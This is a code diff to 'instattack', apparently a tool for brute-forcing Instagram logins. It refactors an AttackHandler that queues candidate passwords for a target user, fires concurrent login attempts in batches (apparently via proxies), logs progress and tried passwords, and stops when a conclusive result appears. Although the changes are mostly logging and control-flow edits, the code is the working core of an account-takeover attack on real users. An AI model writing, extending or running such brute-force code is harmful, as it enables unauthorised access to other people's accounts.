@@ -2,7 +2,7 @@ import asyncio
 import aiohttp
 
 from instattack.config import config
-
+from instattack.lib import logger
 from instattack.lib.utils import percentage, limit_as_completed
 
 from instattack.app.exceptions import NoPasswordsError
@@ -44,6 +44,9 @@ __all__ = (
 )
 
 
+log = logger.get(__name__, 'Attack Handler')
+
+
 class AttackHandler(AbstractLoginHandler):
 
     __name__ = 'Attack Handler'
@@ -78,15 +81,13 @@ class AttackHandler(AbstractLoginHandler):
         return results
 
     async def prepopulate(self, limit=None):
-        log = self.create_logger('prepopulate')
-
         message = f'Generating All Attempts for User {self.user.username}.'
         if limit:
             message = (
                 f'Generating {limit} '
                 f'Attempts for User {self.user.username}.'
             )
-        await log.start(message)
+        log.start(message)
 
         passwords = await self.user.get_new_attempts(self.loop, limit=limit)
         if len(passwords) == 0:
@@ -96,7 +97,23 @@ class AttackHandler(AbstractLoginHandler):
         for password in passwords:
             await self.passwords.put(password)
 
-        await log.success(f"Prepopulated {self.passwords.qsize()} Password Attempts")
+        log.success(f"Prepopulated {self.passwords.qsize()} Password Attempts")
+
+    async def generate_attempts_for_passwords(self, session):
+        """
+        Generates coroutines for each password to be attempted and yields
+        them in the generator.
+
+        We don't have to worry about a stop event if the authenticated result
+        is found since this will generate relatively quickly and the coroutines
+        have not been run yet.
+        """
+        while not self.passwords.empty():
+            password = await self.passwords.get()
+            if password:
+                yield self.attempt_login_with_password(session, password)
+
+        log.debug('Passwords Queue is Empty')
 
     async def login(self):
         """
@@ -107,8 +124,6 @@ class AttackHandler(AbstractLoginHandler):
         using different proxies, so this is the top level of a tree of nested
         concurrent IO operations.
         """
-        log = self.create_logger('login')
-
         cookies = await self.cookies()
         await self.start_event.wait()
 
@@ -120,17 +135,22 @@ class AttackHandler(AbstractLoginHandler):
 
             results = InstagramResults(results=[])
 
-            async for (result, num_tries), current_attempts, current_tasks in limit_as_completed(
+            async for fut in limit_as_completed(
                 coros=self.generate_attempts_for_passwords(session),
                 batch_size=config['passwords']['batch_size'],
-                stop_event=self.stop_event
+                stop_event=self.stop_event,
             ):
+                if fut.exception():
+                    raise fut.exception()
+
+                result, num_tries = fut.result()
+
                 if result.conclusive:
                     self.num_completed += 1
                     results.add(result)
 
                     pct = percentage(self.num_completed, self.num_passwords)
-                    await log.info(f'{pct}', extra={
+                    log.info(f'{pct}', extra={
                         'other': f'Num Attempts: {num_tries}',
                         'password': result.password,
                     })
@@ -144,6 +164,4 @@ class AttackHandler(AbstractLoginHandler):
                         break
 
         await asyncio.sleep(0)
-        await self.close_scheduler()
-
         return results
